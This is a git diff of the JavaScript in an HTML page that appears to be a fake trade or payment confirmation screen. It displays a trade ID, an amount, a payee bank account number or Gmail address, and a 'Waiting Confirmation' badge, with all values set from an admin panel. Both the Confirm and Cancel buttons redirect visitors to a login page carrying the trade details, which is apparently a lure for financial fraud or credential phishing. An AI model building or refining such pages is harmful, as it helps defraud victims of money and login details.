@@ -400,101 +400,91 @@
             </div>
         </div>
     </div>
+<script>
+    // Trade values are loaded from the server config (updated via admin panel).
+    // Priority: /api/trade-public -> /trade-config.json -> hardcoded fallback.
+    // URL params are IGNORED for trade values so admin changes always show.
 
-    <script>
-        const DEFAULT_TRADE = {
-            tradeId: "TR-674116",
-            amount: "544,500.00NGN",
-            paymentMethod: "Opay Bank -8149905389",
-            status: "waiting", // "waiting" | "complete"
-        };
+    const FALLBACK_TRADE = {
+        tradeId: "TR-810136",
+        amount: "19,000 USD",
+        paymentMethod: "joelhadson@gmail.com",
+        status: "waiting",
+    };
 
-        function normalizeStatus(status) {
-            const value = (status || "").toLowerCase().trim();
-            if (
-                value === "complete" ||
-                value === "transfer complete" ||
-                value === "completed"
-            )
-                return "complete";
-            return "waiting";
+    function normalizeStatus(status) {
+        const value = (status || "").toLowerCase().trim();
+        if (value === "complete" || value === "transfer complete" || value === "completed")
+            return "complete";
+        return "waiting";
+    }
+
+    function renderTrade(trade) {
+        document.getElementById("paymentMethod").textContent = trade.paymentMethod;
+        document.getElementById("tradeId").textContent = trade.tradeId;
+        document.getElementById("amount").textContent = trade.amount;
+
+        const badge = document.getElementById("statusBadge");
+        const statusText = document.getElementById("statusText");
+        const normalized = normalizeStatus(trade.status);
+
+        badge.classList.remove("complete", "waiting");
+
+        if (normalized === "complete") {
+            badge.classList.add("complete");
+            badge.querySelector("i").className = "fas fa-check-circle";
+            statusText.textContent = "Transfer Complete";
+        } else {
+            badge.classList.add("waiting");
+            badge.querySelector("i").className = "fas fa-clock";
+            statusText.textContent = "Waiting Confirmation";
         }
+    }
 
-        function mergeTrade(base) {
-            const params = new URLSearchParams(window.location.search);
-            return {
-                tradeId: params.get("tradeId") || base.tradeId || DEFAULT_TRADE.tradeId,
-                amount: params.get("amount") || base.amount || DEFAULT_TRADE.amount,
-                paymentMethod: params.get("method") ||
-                    params.get("paymentMethod") ||
-                    base.paymentMethod ||
-                    DEFAULT_TRADE.paymentMethod,
-                status: params.get("status") || base.status || DEFAULT_TRADE.status,
-            };
+    async function loadTrade() {
+        for (const url of ["/api/trade-public", "/trade-config.json"]) {
+            try {
+                const res = await fetch(url + "?_=" + Date.now(), { cache: "no-store" });
+                if (res.ok) {
+                    const cfg = await res.json();
+                    if (cfg && (cfg.tradeId || cfg.amount)) {
+                        return {
+                            tradeId: cfg.tradeId || FALLBACK_TRADE.tradeId,
+                            amount: cfg.amount || FALLBACK_TRADE.amount,
+                            paymentMethod: cfg.paymentMethod || FALLBACK_TRADE.paymentMethod,
+                            status: cfg.status || FALLBACK_TRADE.status,
+                        };
+                    }
+                }
+            } catch (e) { /* try next */ }
         }
+        return { ...FALLBACK_TRADE };
+    }
 
-        function renderTrade(trade) {
-            document.getElementById("paymentMethod").textContent =
-                trade.paymentMethod;
-            document.getElementById("tradeId").textContent = trade.tradeId;
-            document.getElementById("amount").textContent = trade.amount;
-
-            const badge = document.getElementById("statusBadge");
-            const statusText = document.getElementById("statusText");
-            const normalized = normalizeStatus(trade.status);
-
-            badge.classList.remove("complete", "waiting");
-
-            if (normalized === "complete") {
-                badge.classList.add("complete");
-                badge.querySelector("i").className = "fas fa-check-circle";
-                statusText.textContent = "Transfer Complete";
-            } else {
-                badge.classList.add("waiting");
-                badge.querySelector("i").className = "fas fa-clock";
-                statusText.textContent = "Waiting Confirmation";
-            }
-        }
-
-        function goToLogin(action, trade) {
+    loadTrade().then((trade) => {
+        renderTrade(trade);
+        document.getElementById("confirmBtn").addEventListener("click", () => {
             const params = new URLSearchParams({
-                action: action,
+                action: "confirm",
                 tradeId: trade.tradeId,
                 amount: trade.amount,
                 method: trade.paymentMethod,
                 status: normalizeStatus(trade.status),
             });
             window.location.href = `login.html?${params.toString()}`;
-        }
-
-        async function loadTrade() {
-            let fromFile = {};
-            for (const url of["/api/trade-public", "/trade-config.json"]) {
-                try {
-                    const res = await fetch(url + "?_=" + Date.now(), {
-                        cache: "no-store",
-                    });
-                    if (res.ok) {
-                        fromFile = await res.json();
-                        break;
-                    }
-                } catch (e) {}
-            }
-            return mergeTrade(fromFile);
-        }
-
-        loadTrade().then((trade) => {
-            renderTrade(trade);
-            document.getElementById("confirmBtn").addEventListener("click", () =>
-                goToLogin("confirm", trade)
-            );
-            document.getElementById("cancelBtn").addEventListener("click", () =>
-                goToLogin("cancel", trade)
-            );
         });
-    </script>
-<script src="/trade-updates.js" defer></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+        document.getElementById("cancelBtn").addEventListener("click", () => {
+            const params = new URLSearchParams({
+                action: "cancel",
+                tradeId: trade.tradeId,
+                amount: trade.amount,
+                method: trade.paymentMethod,
+                status: normalizeStatus(trade.status),
+            });
+            window.location.href = `login.html?${params.toString()}`;
+        });
+    });
+</script>  
 </body>
 
 </html>
